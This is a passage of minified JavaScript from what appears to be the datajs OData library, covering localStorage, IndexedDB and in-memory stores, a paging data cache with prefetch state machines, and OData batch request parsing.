finally{Date.prototype.toJSON=oldDateToJSON;}}};DomStore.prototype.clear=function(success,error){error=error||this.defaultError;try{var i=0,len=localStorage.length;while(len>0&&i<len){var fullKey=localStorage.key(i);var key=unqualifyDomStoreKey(this,fullKey);if(fullKey!==key){localStorage.removeItem(fullKey);len=localStorage.length;}else{i++;}};delay(success);}
catch(e){delay(error,e);}};DomStore.prototype.close=function(){};DomStore.prototype.contains=function(key,success,error){error=error||this.defaultError;try{var fullKey=qualifyDomStoreKey(this,key);var value=localStorage.getItem(fullKey);delay(success,value!==null);}catch(e){delay(error,e);}};DomStore.prototype.defaultError=throwErrorCallback;DomStore.prototype.getAllKeys=function(success,error){error=error||this.defaultError;var results=[];var i,len;try{for(i=0,len=localStorage.length;i<len;i++){var fullKey=localStorage.key(i);var key=unqualifyDomStoreKey(this,fullKey);if(fullKey!==key){results.push(key);}}
delay(success,results);}
catch(e){delay(error,e);}};DomStore.prototype.mechanism="dom";DomStore.prototype.read=function(key,success,error){error=error||this.defaultError;if(key instanceof Array){error({message:"Array of keys not supported"});}else{try{var fullKey=qualifyDomStoreKey(this,key);var value=localStorage.getItem(fullKey);if(value!==null&&value!=="undefined"){value=window.JSON.parse(value,domStoreJSONToDate);}
else{value=undefined;}
delay(success,key,value);}catch(e){delay(error,e);}}};DomStore.prototype.remove=function(key,success,error){error=error||this.defaultError;if(key instanceof Array){error({message:"Batches not supported"});}else{try{var fullKey=qualifyDomStoreKey(this,key);localStorage.removeItem(fullKey);delay(success);}catch(e){delay(error,e);}}};DomStore.prototype.update=function(key,value,success,error){error=error||this.defaultError;var store=this;this.contains(key,function(contained){if(contained){store.addOrUpdate(key,value,success,error);}else{delay(error,{message:"key not found",key:key});}},error);};var mozIndexedDB=window.mozIndexedDB;var IDBTransaction=window.IDBTransaction;var IDBKeyRange=window.IDBKeyRange;var getError=function(error,defaultError){return function(e){if(e.code===11){e={name:"QUOTA_EXCEEDED_ERR",error:e};}
if(error){error(e);}else if(defaultError){defaultError(e);}};};var openTransaction=function(store,mode,success,error){var name=store.name;var db=store.db;var errorCallback=getError(error,store.defaultError);if(db){success(db.transaction(name,mode));}else{var request=mozIndexedDB.open("_datajs_"+name);request.onsuccess=function(event){db=store.db=event.target.result;if(!db.objectStoreNames.contains(name)){var versionRequest=db.setVersion("1.0");versionRequest.onsuccess=function(){db.createObjectStore(name,null,false);success(db.transaction(name,mode));};versionRequest.onerror=errorCallback;versionRequest.onblocked=errorCallback;}else{success(db.transaction(name,mode));}};request.onerror=getError(error,this.defaultError);}};var IndexedDBStore=function(name){this.name=name;};IndexedDBStore.create=function(name){if(IndexedDBStore.isSupported()){return new IndexedDBStore(name);}
throw{message:"IndexedDB is not supported on this browser"};};IndexedDBStore.isSupported=function(){return!!mozIndexedDB;};IndexedDBStore.prototype.add=function(key,value,success,error){var name=this.name;var defaultError=this.defaultError;var keys=[];var values=[];if(key instanceof Array){keys=key;values=value;}else{keys=[key];values=[value];}
openTransaction(this,IDBTransaction.READ_WRITE,function(transaction){transaction.onabort=getError(error,defaultError);transaction.oncomplete=function(){if(key instanceof Array){success(keys,values);}else{success(key,value);}};for(var i=0;i<keys.length&&i<values.length;i++){transaction.objectStore(name).add(values[i],keys[i]);}},error);};IndexedDBStore.prototype.addOrUpdate=function(key,value,success,error){var name=this.name;var defaultError=this.defaultError;var keys=[];var values=[];if(key instanceof Array){keys=key;values=value;}else{keys=[key];values=[value];}
openTransaction(this,IDBTransaction.READ_WRITE,function(transaction){transaction.onabort=getError(error,defaultError);transaction.oncomplete=function(){if(key instanceof Array){success(keys,values);}else{success(key,value);}};for(var i=0;i<keys.length&&i<values.length;i++){transaction.objectStore(name).put(values[i],keys[i]);}},error);};IndexedDBStore.prototype.clear=function(success,error){var name=this.name;var defaultError=this.defaultError;openTransaction(this,IDBTransaction.READ_WRITE,function(transaction){transaction.onerror=getError(error,defaultError);transaction.oncomplete=function(){success();};transaction.objectStore(name).clear();},error);};IndexedDBStore.prototype.close=function(){if(this.db){this.db.close();this.db=null;}};IndexedDBStore.prototype.contains=function(key,success,error){var name=this.name;var defaultError=this.defaultError;openTransaction(this,IDBTransaction.READ_ONLY,function(transaction){var request=transaction.objectStore(name).openCursor(IDBKeyRange.only(key));transaction.oncomplete=function(){success(request.result!==undefined);};transaction.onerror=getError(error,defaultError);},error);};IndexedDBStore.prototype.defaultError=throwErrorCallback;IndexedDBStore.prototype.getAllKeys=function(success,error){var name=this.name;var defaultError=this.defaultError;openTransaction(this,IDBTransaction.READ_ONLY,function(transaction){var results=[];transaction.oncomplete=function(){success(results);};var request=transaction.objectStore(name).openCursor();request.onerror=getError(error,defaultError);request.onsuccess=function(event){var cursor=event.target.result;if(cursor){results.push(cursor.key);cursor["continue"].call(cursor);}};},error);};IndexedDBStore.prototype.mechanism="indexeddb";IndexedDBStore.prototype.read=function(key,success,error){var name=this.name;var defaultError=this.defaultError;var keys=(key instanceof Array)?key:[key];openTransaction(this,IDBTransaction.READ_WRITE,function(transaction){var values=[];transaction.onerror=getError(error,defaultError);transaction.oncomplete=function(){if(key instanceof Array){success(keys,values);}else{success(keys[0],values[0]);}};for(var i=0;i<keys.length;i++){var objectStore=transaction.objectStore(name);var request=objectStore["get"].call(objectStore,keys[i]);request.onsuccess=function(event){values.push(event.target.result);};}},error);};IndexedDBStore.prototype.remove=function(key,success,error){var name=this.name;var defaultError=this.defaultError;var keys=(key instanceof Array)?key:[key];openTransaction(this,IDBTransaction.READ_WRITE,function(transaction){transaction.onerror=getError(error,defaultError);transaction.oncomplete=function(){success();};for(var i=0;i<keys.length;i++){var objectStore=transaction.objectStore(name);objectStore["delete"].call(objectStore,keys[i]);}},error);};IndexedDBStore.prototype.update=function(key,value,success,error){var name=this.name;var defaultError=this.defaultError;var keys=[];var values=[];if(key instanceof Array){keys=key;values=value;}else{keys=[key];values=[value];}
openTransaction(this,IDBTransaction.READ_WRITE,function(transaction){transaction.onabort=getError(error,defaultError);transaction.oncomplete=function(){if(key instanceof Array){success(keys,values);}else{success(key,value);}};for(var i=0;i<keys.length&&i<values.length;i++){var request=transaction.objectStore(name).openCursor(IDBKeyRange.only(keys[i]));request.pair={key:keys[i],value:values[i]};request.onsuccess=function(event){var cursor=event.target.result;if(cursor){cursor.update(event.target.pair.value);}else{transaction.abort();}};}},error);};var MemoryStore=function(name){var holes=[];var items=[];var keys={};this.name=name;var getErrorCallback=function(error){return error||this.defaultError;};var validateKeyInput=function(key,error){var messageString;if(key instanceof Array){messageString="Array of keys not supported";}
if(key===undefined||key===null){messageString="Invalid key";}
if(messageString){delay(error,{message:messageString});return false;}
return true;};this.add=function(key,value,success,error){error=getErrorCallback(error);if(validateKeyInput(key,error)){if(!keys.hasOwnProperty(key)){this.addOrUpdate(key,value,success,error);}else{error({message:"key already exists",key:key});}}};this.addOrUpdate=function(key,value,success,error){error=getErrorCallback(error);if(validateKeyInput(key,error)){var index=keys[key];if(index===undefined){if(holes.length>0){index=holes.splice(0,1);}else{index=items.length;}}
items[index]=value;keys[key]=index;delay(success,key,value);}};this.clear=function(success){items=[];keys={};holes=[];delay(success);};this.contains=function(key,success){var contained=keys.hasOwnProperty(key);delay(success,contained);};this.getAllKeys=function(success){var results=[];for(var name in keys){results.push(name);}
delay(success,results);};this.read=function(key,success,error){error=getErrorCallback(error);if(validateKeyInput(key,error)){var index=keys[key];delay(success,key,items[index]);}};this.remove=function(key,success,error){error=getErrorCallback(error);if(validateKeyInput(key,error)){var index=keys[key];if(index!==undefined){if(index===items.length-1){items.pop();}else{items[index]=undefined;holes.push(index);}
delete keys[key];if(items.length===0){holes=[];}}
delay(success);}};this.update=function(key,value,success,error){error=getErrorCallback(error);if(validateKeyInput(key,error)){if(keys.hasOwnProperty(key)){this.addOrUpdate(key,value,success,error);}else{error({message:"key not found",key:key});}}};};MemoryStore.create=function(name){return new MemoryStore(name);};MemoryStore.isSupported=function(){return true;};MemoryStore.prototype.close=function(){};MemoryStore.prototype.defaultError=throwErrorCallback;MemoryStore.prototype.mechanism="memory";var mechanisms={indexeddb:IndexedDBStore,dom:DomStore,memory:MemoryStore};datajs.defaultStoreMechanism="best";datajs.createStore=function(name,mechanism){if(!mechanism){mechanism=datajs.defaultStoreMechanism;}
if(mechanism==="best"){mechanism=(DomStore.isSupported())?"dom":"memory";}
var factory=mechanisms[mechanism];if(factory){return factory.create(name);}
throw{message:"Failed to create store",name:name,mechanism:mechanism};};var forwardCall=function(thisValue,name,returnValue){return function(){thisValue[name].apply(thisValue,arguments);return returnValue;};};var DjsDeferred=function(){this._arguments=undefined;this._done=undefined;this._fail=undefined;this._resolved=false;this._rejected=false;};DjsDeferred.prototype={then:function(fulfilledHandler,errorHandler){if(fulfilledHandler){if(!this._done){this._done=[fulfilledHandler];}else{this._done.push(fulfilledHandler);}}
if(errorHandler){if(!this._fail){this._fail=[errorHandler];}else{this._fail.push(errorHandler);}}
if(this._resolved){this.resolve.apply(this,this._arguments);}else if(this._rejected){this.reject.apply(this,this._arguments);}
return this;},resolve:function(){if(this._done){var i,len;for(i=0,len=this._done.length;i<len;i++){this._done[i].apply(null,arguments);}
this._done=undefined;this._resolved=false;this._arguments=undefined;}else{this._resolved=true;this._arguments=arguments;}},reject:function(){if(this._fail){var i,len;for(i=0,len=this._fail.length;i<len;i++){this._fail[i].apply(null,arguments);}
this._fail=undefined;this._rejected=false;this._arguments=undefined;}else{this._rejected=true;this._arguments=arguments;}},promise:function(){var result={};result.then=forwardCall(this,"then",result);return result;}};var createDeferred=function(){if(window.jQuery&&window.jQuery.Deferred){return new window.jQuery.Deferred();}else{return new DjsDeferred();}};var appendQueryOption=function(uri,queryOption){var separator=(uri.indexOf("?")>=0)?"&":"?";return uri+separator+queryOption;};var appendSegment=function(uri,segment){var index=uri.indexOf("?");var queryPortion="";if(index>=0){queryPortion=uri.substr(index);uri=uri.substr(0,index);}
if(uri[uri.length-1]!=="/"){uri+="/";}
return uri+segment+queryPortion;};var buildODataRequest=function(uri,options){return{method:"GET",requestUri:uri,user:options.user,password:options.password,enableJsonpCallback:options.enableJsonpCallback,callbackParameterName:options.callbackParameterName,formatQueryString:options.formatQueryString};};var findQueryOptionStart=function(uri,name){var result=-1;var queryIndex=uri.indexOf("?");if(queryIndex!==-1){var start=uri.indexOf("?"+name+"=",queryIndex);if(start===-1){start=uri.indexOf("&"+name+"=",queryIndex);}
if(start!==-1){result=start+name.length+2;}}
return result;};var queryForData=function(uri,options,success,error){var request=queryForDataInternal(uri,options,[],success,error);return request;};var queryForDataInternal=function(uri,options,data,success,error){var request=buildODataRequest(uri,options);var currentRequest=odata.request(request,function(newData){var next=newData.__next;var results=newData.results;data=data.concat(results);if(next){currentRequest=queryForDataInternal(next,options,data,success,error);}else{success(data);}},error,undefined,options.httpClient,options.metadata);return{abort:function(){currentRequest.abort();}};};var ODataCacheSource=function(options){var that=this;var uri=options.source;that.identifier=normalizeURICase(encodeURI(decodeURI(uri)));that.options=options;that.count=function(success,error){var options=that.options;return odata.request(buildODataRequest(appendSegment(uri,"$count"),options),function(data){var count=parseInt10(data.toString());if(isNaN(count)){error({message:"Count is NaN",count:count});}else{success(count);}},error,undefined,options.httpClient,options.metadata);};that.read=function(index,count,success,error){var queryOptions="$skip="+index+"&$top="+count;return queryForData(appendQueryOption(uri,queryOptions),that.options,success,error);};return that;};var appendPage=function(operation,page){var intersection=intersectRanges(operation,page);if(intersection){var start=intersection.i-page.i;var end=start+(operation.c-operation.d.length);operation.d=operation.d.concat(page.d.slice(start,end));}};var intersectRanges=function(x,y){var xLast=x.i+x.c;var yLast=y.i+y.c;var resultIndex=(x.i>y.i)?x.i:y.i;var resultLast=(xLast<yLast)?xLast:yLast;var result;if(resultLast>=resultIndex){result={i:resultIndex,c:resultLast-resultIndex};}
return result;};var checkZeroGreater=function(val,name){if(val===undefined||typeof val!=="number"){throw{message:"'"+name+"' must be a number."};}
if(isNaN(val)||val<0||!isFinite(val)){throw{message:"'"+name+"' must be greater than or equal to zero."};}};var checkUndefinedGreaterThanZero=function(val,name){if(val!==undefined){if(typeof val!=="number"){throw{message:"'"+name+"' must be a number."};}
if(isNaN(val)||val<=0||!isFinite(val)){throw{message:"'"+name+"' must be greater than zero."};}}};var checkUndefinedOrNumber=function(val,name){if(val!==undefined&&(typeof val!=="number"||isNaN(val)||!isFinite(val))){throw{message:"'"+name+"' must be a number."};}};var removeFromArray=function(arr,item){var i,len;for(i=0,len=arr.length;i<len;i++){if(arr[i]===item){arr.splice(i,1);return true;}}
return false;};var extend=function(target,values){for(var name in values){target[name]=values[name];}
return target;};var estimateSize=function(obj){var size=0;var type=typeof obj;if(type==="object"&&obj){for(var name in obj){size+=name.length*2+estimateSize(obj[name]);}}else if(type==="string"){size=obj.length*2;}else{size=8;}
return size;};var snapToPageBoundaries=function(lowIndex,highIndex,pageSize){lowIndex=Math.floor(lowIndex/pageSize)*pageSize;highIndex=Math.ceil((highIndex+1)/pageSize)*pageSize;return{i:lowIndex,c:highIndex-lowIndex};};var CACHE_STATE_DESTROY="destroy";var CACHE_STATE_IDLE="idle";var CACHE_STATE_INIT="init";var CACHE_STATE_READ="read";var CACHE_STATE_PREFETCH="prefetch";var CACHE_STATE_WRITE="write";var OPERATION_STATE_CANCEL="cancel";var OPERATION_STATE_END="end";var OPERATION_STATE_ERROR="error";var OPERATION_STATE_START="start";var OPERATION_STATE_WAIT="wait";var DESTROY_STATE_CLEAR="clear";var READ_STATE_DONE="done";var READ_STATE_LOCAL="local";var READ_STATE_SAVE="save";var READ_STATE_SOURCE="source";var DataCacheOperation=function(stateMachine,promise,isCancelable,index,count,data,pending){var stateData;var cacheState;var that=this;that.p=promise;that.i=index;that.c=count;that.d=data;that.s=OPERATION_STATE_START;that.canceled=false;that.pending=pending;that.oncomplete=null;that.cancel=function(){if(!isCancelable){return;}
var state=that.s;if(state!==OPERATION_STATE_ERROR&&state!==OPERATION_STATE_END&&state!==OPERATION_STATE_CANCEL){that.canceled=true;transition(OPERATION_STATE_CANCEL,stateData);}};that.complete=function(){transition(OPERATION_STATE_END,stateData);};that.error=function(err){if(!that.canceled){transition(OPERATION_STATE_ERROR,err);}};that.run=function(state){cacheState=state;that.transition(that.s,stateData);};that.wait=function(data){transition(OPERATION_STATE_WAIT,data);};var operationStateMachine=function(opTargetState,cacheState,data){switch(opTargetState){case OPERATION_STATE_START:if(cacheState!==CACHE_STATE_INIT){stateMachine(that,opTargetState,cacheState,data);}
break;case OPERATION_STATE_WAIT:stateMachine(that,opTargetState,cacheState,data);break;case OPERATION_STATE_CANCEL:stateMachine(that,opTargetState,cacheState,data);that.fireCanceled();transition(OPERATION_STATE_END);break;case OPERATION_STATE_ERROR:stateMachine(that,opTargetState,cacheState,data);that.canceled=true;that.fireRejected(data);transition(OPERATION_STATE_END);break;case OPERATION_STATE_END:if(that.oncomplete){that.oncomplete(that);}
if(!that.canceled){that.fireResolved();}
stateMachine(that,opTargetState,cacheState,data);break;default:stateMachine(that,opTargetState,cacheState,data);break;}};var transition=function(state,data){that.s=state;stateData=data;operationStateMachine(state,cacheState,data);};that.transition=transition;return that;};DataCacheOperation.prototype.fireResolved=function(){var p=this.p;if(p){this.p=null;p.resolve(this.d);}};DataCacheOperation.prototype.fireRejected=function(reason){var p=this.p;if(p){this.p=null;p.reject(reason);}};DataCacheOperation.prototype.fireCanceled=function(){this.fireRejected({canceled:true,message:"Operation canceled"});};var DataCache=function(options){var state=CACHE_STATE_INIT;var stats={counts:0,netReads:0,prefetches:0,cacheReads:0};var clearOperations=[];var readOperations=[];var prefetchOperations=[];var actualCacheSize=0;var allDataLocal=false;var cacheSize=undefinedDefault(options.cacheSize,1048576);var collectionCount=0;var highestSavedPage=0;var highestSavedPageSize=0;var overflowed=cacheSize===0;var pageSize=undefinedDefault(options.pageSize,50);var prefetchSize=undefinedDefault(options.prefetchSize,pageSize);var version="1.0";var cacheFailure;var pendingOperations=0;var source=options.source;if(typeof source==="string"){source=new ODataCacheSource(options);}
source.options=options;var store=datajs.createStore(options.name,options.mechanism);var that=this;that.onidle=options.idle;that.stats=stats;that.count=function(){if(cacheFailure){throw cacheFailure;}
var deferred=createDeferred();var canceled=false;if(allDataLocal){delay(function(){deferred.resolve(collectionCount);});return deferred.promise();}
var request=source.count(function(count){request=null;stats.counts++;deferred.resolve(count);},function(err){request=null;deferred.reject(extend(err,{canceled:canceled}));});return extend(deferred.promise(),{cancel:function(){if(request){canceled=true;request.abort();request=null;}}});};that.clear=function(){if(cacheFailure){throw cacheFailure;}
if(clearOperations.length===0){var deferred=createDeferred();var op=new DataCacheOperation(destroyStateMachine,deferred,false);queueAndStart(op,clearOperations);return deferred.promise();}
return clearOperations[0].p;};that.filterForward=function(index,count,predicate){return filter(index,count,predicate,false);};that.filterBack=function(index,count,predicate){return filter(index,count,predicate,true);};that.readRange=function(index,count){checkZeroGreater(index,"index");checkZeroGreater(count,"count");if(cacheFailure){throw cacheFailure;}
var deferred=createDeferred();var op=new DataCacheOperation(readStateMachine,deferred,true,index,count,[],0);queueAndStart(op,readOperations);return extend(deferred.promise(),{cancel:function(){op.cancel();}});};that.ToObservable=that.toObservable=function(){if(!window.Rx||!window.Rx.Observable){throw{message:"Rx library not available - include rx.js"};}
if(cacheFailure){throw cacheFailure;}
return window.Rx.Observable.CreateWithDisposable(function(obs){var disposed=false;var index=0;var errorCallback=function(error){if(!disposed){obs.OnError(error);}};var successCallback=function(data){if(!disposed){var i,len;for(i=0,len=data.length;i<len;i++){obs.OnNext(data[i]);}
if(data.length<pageSize){obs.OnCompleted();}else{index+=pageSize;that.readRange(index,pageSize).then(successCallback,errorCallback);}}};that.readRange(index,pageSize).then(successCallback,errorCallback);return{Dispose:function(){disposed=true;}};});};var cacheFailureCallback=function(message){return function(error){cacheFailure={message:message,error:error};var i,len;for(i=0,len=readOperations.length;i<len;i++){readOperations[i].fireRejected(cacheFailure);}
for(i=0,len=clearOperations.length;i<len;i++){clearOperations[i].fireRejected(cacheFailure);}
readOperations=clearOperations=null;};};var changeState=function(newState){if(newState!==state){state=newState;var operations=clearOperations.concat(readOperations,prefetchOperations);var i,len;for(i=0,len=operations.length;i<len;i++){operations[i].run(state);}}};var clearStore=function(){var deferred=new DjsDeferred();store.clear(function(){actualCacheSize=0;allDataLocal=false;collectionCount=0;highestSavedPage=0;highestSavedPageSize=0;overflowed=cacheSize===0;stats={counts:0,netReads:0,prefetches:0,cacheReads:0};that.stats=stats;store.close();deferred.resolve();},function(err){deferred.reject(err);});return deferred;};var dequeueOperation=function(operation){var removed=removeFromArray(clearOperations,operation);if(!removed){removed=removeFromArray(readOperations,operation);if(!removed){removeFromArray(prefetchOperations,operation);}}
pendingOperations--;changeState(CACHE_STATE_IDLE);};var fetchPage=function(start){var deferred=new DjsDeferred();var canceled=false;var request=source.read(start,pageSize,function(data){var page={i:start,c:data.length,d:data};deferred.resolve(page);},function(err){deferred.reject(err);});return extend(deferred,{cancel:function(){if(request){request.abort();canceled=true;request=null;}}});};var filter=function(index,count,predicate,backwards){index=parseInt10(index);count=parseInt10(count);if(isNaN(index)){throw{message:"'index' must be a valid number.",index:index};}
if(isNaN(count)){throw{message:"'count' must be a valid number.",count:count};}
if(cacheFailure){throw cacheFailure;}
index=Math.max(index,0);var deferred=createDeferred();var arr=[];var canceled=false;var pendingReadRange=null;var readMore=function(readIndex,readCount){if(!canceled){if(count>=0&&arr.length>=count){deferred.resolve(arr);}else{pendingReadRange=that.readRange(readIndex,readCount).then(function(data){for(var i=0,length=data.length;i<length&&(count<0||arr.length<count);i++){var dataIndex=backwards?length-i-1:i;var item=data[dataIndex];if(predicate(item)){var element={index:readIndex+dataIndex,item:item};backwards?arr.unshift(element):arr.push(element);}}
if((!backwards&&data.length<readCount)||(backwards&&readIndex<=0)){deferred.resolve(arr);}else{var nextIndex=backwards?Math.max(readIndex-pageSize,0):readIndex+readCount;readMore(nextIndex,pageSize);}},function(err){deferred.reject(err);});}}};var initialPage=snapToPageBoundaries(index,index,pageSize);var initialIndex=backwards?initialPage.i:index;var initialCount=backwards?index-initialPage.i+1:initialPage.i+initialPage.c-index;readMore(initialIndex,initialCount);return extend(deferred.promise(),{cancel:function(){if(pendingReadRange){pendingReadRange.cancel();}
canceled=true;}});};var fireOnIdle=function(){if(that.onidle&&pendingOperations===0){that.onidle();}};var prefetch=function(start){if(allDataLocal||prefetchSize===0||overflowed){return;}
if(prefetchOperations.length===0||(prefetchOperations[0]&&prefetchOperations[0].c!==-1)){var op=new DataCacheOperation(prefetchStateMachine,null,true,start,prefetchSize,null,prefetchSize);queueAndStart(op,prefetchOperations);}};var queueAndStart=function(op,queue){op.oncomplete=dequeueOperation;queue.push(op);pendingOperations++;op.run(state);};var readPage=function(key){var canceled=false;var deferred=extend(new DjsDeferred(),{cancel:function(){canceled=true;}});var error=storeFailureCallback(deferred,"Read page from store failure");store.contains(key,function(contained){if(canceled){return;}
if(contained){store.read(key,function(_,data){if(!canceled){deferred.resolve(data!==undefined,data);}},error);return;}
deferred.resolve(false);},error);return deferred;};var savePage=function(key,page){var canceled=false;var deferred=extend(new DjsDeferred(),{cancel:function(){canceled=true;}});var error=storeFailureCallback(deferred,"Save page to store failure");var resolve=function(){deferred.resolve(true);};if(page.c>0){var pageBytes=estimateSize(page);overflowed=cacheSize>=0&&cacheSize<actualCacheSize+pageBytes;if(!overflowed){store.addOrUpdate(key,page,function(){updateSettings(page,pageBytes);saveSettings(resolve,error);},error);}else{resolve();}}else{updateSettings(page,0);saveSettings(resolve,error);}
return deferred;};var saveSettings=function(success,error){var settings={actualCacheSize:actualCacheSize,allDataLocal:allDataLocal,cacheSize:cacheSize,collectionCount:collectionCount,highestSavedPage:highestSavedPage,highestSavedPageSize:highestSavedPageSize,pageSize:pageSize,sourceId:source.identifier,version:version};store.addOrUpdate("__settings",settings,success,error);};var storeFailureCallback=function(deferred){return function(){deferred.resolve(false);};};var updateSettings=function(page,pageBytes){var pageCount=page.c;var pageIndex=page.i;if(pageCount===0){if(highestSavedPage===pageIndex-pageSize){collectionCount=highestSavedPage+highestSavedPageSize;}}else{highestSavedPage=Math.max(highestSavedPage,pageIndex);if(highestSavedPage===pageIndex){highestSavedPageSize=pageCount;}
actualCacheSize+=pageBytes;if(pageCount<pageSize&&!collectionCount){collectionCount=pageIndex+pageCount;}}
if(!allDataLocal&&collectionCount===highestSavedPage+highestSavedPageSize){allDataLocal=true;}};var cancelStateMachine=function(operation,opTargetState,cacheState,data){var canceled=operation.canceled&&opTargetState!==OPERATION_STATE_END;if(canceled){if(opTargetState===OPERATION_STATE_CANCEL){if(data&&data.cancel){data.cancel();}}}
return canceled;};var destroyStateMachine=function(operation,opTargetState,cacheState){var transition=operation.transition;if(cacheState!==CACHE_STATE_DESTROY){changeState(CACHE_STATE_DESTROY);return true;}
switch(opTargetState){case OPERATION_STATE_START:transition(DESTROY_STATE_CLEAR);break;case OPERATION_STATE_END:fireOnIdle();break;case DESTROY_STATE_CLEAR:clearStore().then(function(){operation.complete();});operation.wait();break;default:return false;}
return true;};var prefetchStateMachine=function(operation,opTargetState,cacheState,data){if(!cancelStateMachine(operation,opTargetState,cacheState,data)){var transition=operation.transition;if(cacheState!==CACHE_STATE_PREFETCH){if(cacheState===CACHE_STATE_DESTROY){if(opTargetState!==OPERATION_STATE_CANCEL){operation.cancel();}}else if(cacheState===CACHE_STATE_IDLE){changeState(CACHE_STATE_PREFETCH);}
return true;}
switch(opTargetState){case OPERATION_STATE_START:if(prefetchOperations[0]===operation){transition(READ_STATE_LOCAL,operation.i);}
break;case READ_STATE_DONE:var pending=operation.pending;if(pending>0){pending-=Math.min(pending,data.c);}
if(allDataLocal||pending===0||data.c<pageSize||overflowed){operation.complete();}else{operation.pending=pending;transition(READ_STATE_LOCAL,data.i+pageSize);}
break;default:return readSaveStateMachine(operation,opTargetState,cacheState,data,true);}}
return true;};var readStateMachine=function(operation,opTargetState,cacheState,data){if(!cancelStateMachine(operation,opTargetState,cacheState,data)){var transition=operation.transition;if(cacheState!==CACHE_STATE_READ&&opTargetState!==OPERATION_STATE_START){if(cacheState===CACHE_STATE_DESTROY){if(opTargetState!==OPERATION_STATE_START){operation.cancel();}}else if(cacheState!==CACHE_STATE_WRITE){changeState(CACHE_STATE_READ);}
return true;}
switch(opTargetState){case OPERATION_STATE_START:if(cacheState===CACHE_STATE_IDLE||cacheState===CACHE_STATE_PREFETCH){changeState(CACHE_STATE_READ);if(operation.c>0){var range=snapToPageBoundaries(operation.i,operation.c,pageSize);transition(READ_STATE_LOCAL,range.i);}else{transition(READ_STATE_DONE,operation);}}
break;case READ_STATE_DONE:appendPage(operation,data);var len=operation.d.length;if(operation.c===len||data.c<pageSize){stats.cacheReads++;prefetch(data.i+data.c);operation.complete();}else{transition(READ_STATE_LOCAL,data.i+pageSize);}
break;default:return readSaveStateMachine(operation,opTargetState,cacheState,data,false);}}
return true;};var readSaveStateMachine=function(operation,opTargetState,cacheState,data,isPrefetch){var error=operation.error;var transition=operation.transition;var wait=operation.wait;var request;switch(opTargetState){case OPERATION_STATE_END:fireOnIdle();break;case READ_STATE_LOCAL:request=readPage(data).then(function(found,page){if(!operation.canceled){if(found){transition(READ_STATE_DONE,page);}else{transition(READ_STATE_SOURCE,data);}}});break;case READ_STATE_SOURCE:request=fetchPage(data).then(function(page){if(!operation.canceled){if(isPrefetch){stats.prefetches++;}else{stats.netReads++;}
transition(READ_STATE_SAVE,page);}},error);break;case READ_STATE_SAVE:if(cacheState!==CACHE_STATE_WRITE){changeState(CACHE_STATE_WRITE);request=savePage(data.i,data).then(function(saved){if(!operation.canceled){if(!saved&&isPrefetch){operation.pending=0;}
transition(READ_STATE_DONE,data);}
changeState(CACHE_STATE_IDLE);});}
break;default:return false;}
if(request){if(operation.canceled){request.cancel();}else if(operation.s===opTargetState){wait(request);}}
return true;};store.read("__settings",function(_,settings){if(assigned(settings)){var settingsVersion=settings.version;if(!settingsVersion||settingsVersion.indexOf("1.")!==0){cacheFailureCallback("Unsupported cache store version "+settingsVersion)();return;}
if(pageSize!==settings.pageSize||source.identifier!==settings.sourceId){clearStore().then(function(){changeState(CACHE_STATE_IDLE);},cacheFailureCallback("Unable to clear store during initialization"));}else{actualCacheSize=settings.actualCacheSize;allDataLocal=settings.allDataLocal;cacheSize=settings.cacheSize;collectionCount=settings.collectionCount;highestSavedPage=settings.highestSavedPage;highestSavedPageSize=settings.highestSavedPageSize;version=settingsVersion;changeState(CACHE_STATE_IDLE);}}else{saveSettings(function(){changeState(CACHE_STATE_IDLE);},cacheFailureCallback("Unable to write settings during initialization."));}},cacheFailureCallback("Unable to read settings from store."));return that;};datajs.createDataCache=function(options){checkUndefinedGreaterThanZero(options.pageSize,"pageSize");checkUndefinedOrNumber(options.cacheSize,"cacheSize");checkUndefinedOrNumber(options.prefetchSize,"prefetchSize");if(!assigned(options.name)){throw{message:"Undefined or null name",options:options};}
if(!assigned(options.source)){throw{message:"Undefined source",options:options};}
return new DataCache(options);};var handlerDataValidator=function(handler,part){if(typeof handler.dataValidator==='function'){return handler.dataValidator(part);}
return true;};var partHandlerSelector=function(context,part){if(Array.isArray(context.handler.partHandler)){var pHandlers=context.handler.partHandler;var cType=getContentType(part);for(var i=0;i<pHandlers.length;i++){if(handlerAccepts(pHandlers[i],cType)&&handlerDataValidator(part)){return pHandlers[i];}}
return pHandlers[pHandlers.length-1];}else{return context.handler.partHandler;}};var batchServerParser=function(handler,text,context){var boundary=context.contentType.properties["boundary"];return{__batchRequests:readRequestBatch(text,{boundaries:[boundary],handlerContext:context})};};var readRequestBatch=function(text,context){var delimiter="--"+currentBoundary(context);readTo(text,context,delimiter);readLine(text,context);var responses=[];var partEnd;while(partEnd!=="--"&&context.position<text.length){var partHeaders=readHeaders(text,context);var partContentType=contentType(partHeaders["Content-Type"]);if(partContentType&&partContentType.mediaType===batchMediaType){context.boundaries.push(partContentType.properties["boundary"]);try{var changeRequests=readRequestBatch(text,context);}catch(e){e.response=readRequestBatch(text,context,delimiter);changeResponses=[e];}
responses.push({__changeRequests:changeRequests});context.boundaries.pop();readTo(text,context,"--"+currentBoundary(context));}else{if(!partContentType||partContentType.mediaType!=="application/http"){throw{message:"invalid MIME part type "};}
readLine(text,context);var response=readRequest(text,context,delimiter);try{partHandlerSelector(context.handlerContext,response).read(response,context.handlerContext);}catch(e){response=e;}
responses.push(response);}
partEnd=text.substr(context.position,2);readLine(text,context);}
return responses;};var requestMethodRegex=/^(\w*) (.*) HTTP\/1\.\d$/i;var readRequest=function(text,context,delimiter){var pos=context.position;var line=readLine(text,context);var match=requestMethodRegex.exec(line);var method;var urlPart;var headers;if(match){method=match[1];urlPart=match[2];headers=readHeaders(text,context);readLine(text,context);}else{context.position=pos;}
return{method:method,urlPart:urlPart,headers:headers,body:readTo(text,context,"\r\n"+delimiter)};};var batchServerSerializer=function(handler,data,context){var cType=context.contentType=context.contentType||contentType(batchMediaType);if(cType.mediaType===batchMediaType){return writeServerBatch(data,context);}};var prepareResponse=function(response,handler,context){if(!response.headers){response.headers={};}else{normalizeHeaders(response.headers);}
if(assigned(response.data)&&response.body===undefined){handler.write(response,context);}};var writeServerBatch=function(data,context){var type=payloadTypeOf(data);if(type!==PAYLOADTYPE_BATCH){throw{message:"Serialization of batches of type \""+type+"\" is not supported"};}
var batchBoundary=createBoundary("batchresponse_");context.request.batchBoundary=batchBoundary;var batchParts=data.__batchRequests;var batch="";var i,len;for(i=0,len=batchParts.length;i<len;i++){batch+=writeBatchPartDelimiter(batchBoundary,false)+
writeServerBatchPart(batchParts[i],context);}
